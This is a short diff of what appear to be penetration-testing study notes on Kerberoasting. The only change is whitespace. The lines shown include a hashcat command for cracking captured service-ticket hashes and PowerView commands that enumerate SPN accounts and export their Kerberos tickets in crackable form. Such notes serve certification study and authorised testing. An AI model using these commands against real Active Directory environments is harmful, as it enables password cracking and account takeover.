@@ -39,7 +39,7 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt   //for type 23
 **From Windows**:  CPTS not PNPT  
 Using PowerView:
 Import-Module .\PowerView.ps1   //import powerview  
-Get-DomainUser * -spn | select samaccountname  //list all SPNs
+Get-DomainUser * -spn | select samaccountname  //list all SPNs  
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat  //TGS for one account  
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\marvel_tgs.csv -NoTypeInformation  
 //Request TGS for all SPNs and copy out into CSV file  
